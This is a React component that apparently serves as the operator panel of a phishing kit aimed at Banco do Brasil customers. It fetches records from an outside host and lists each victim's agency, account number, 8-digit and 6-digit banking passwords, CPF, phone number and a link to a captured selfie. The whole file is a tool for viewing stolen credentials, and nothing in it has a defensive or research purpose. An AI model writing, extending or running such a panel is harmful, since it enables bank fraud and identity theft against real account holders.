import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './Panel.css';

const Panel = () => {
  const [data, setData] = useState([]);
  const [expandedItem, setExpandedItem] = useState(null);

  useEffect(() => {
    fetchData();
  }, []);

  const fetchData = async () => {
    try {
      const response = await axios.get('https://pontosbb.x10.mx/data/recuperar.php');
      setData(response.data);
    } catch (error) {
      console.error('Erro ao carregar os dados:', error);
    }
  };

  const handleClick = (index) => {
    // Toggle para expandir ou recolher o item clicado
    if (expandedItem === index) {
      setExpandedItem(null); // Fecha se já estiver expandido
    } else {
      setExpandedItem(index); // Expandir o item clicado
    }
  };

  return (
    <div>
      <span>Banco do Brasil - Selfie Capture</span>
      {data.map((item, index) => (
        <div key={index} style={{ marginBottom: '20px' }}>
          {item && (
            <div className='elementor'>
              <span className='selector' onClick={() => handleClick(index)}>{item.cpf}</span>
              <div className={expandedItem === index ? 'show-element' : 'hide-element'}>
                <p><strong>Agência:</strong> {item.agencia}</p>
                <p><strong>Conta:</strong> {item.conta}</p>
                <p><strong>Senha de 8 dígitos:</strong> {item.senha8}</p>
                <p><strong>CPF:</strong> {item.cpf}</p>
                <p><strong>Telefone:</strong> {item.telefone}</p>
                <p><strong>Senha de 6 dígitos:</strong> {item.senha6}</p>
                <a href={`https://pontosbb.x10.mx/imagens/${item.cpf}.jpg`} target="_blank" rel="noopener noreferrer">Ver Selfie</a>
              </div>
            </div>
          )}
        </div>
      ))}
    </div>
  );
};

export default Panel;
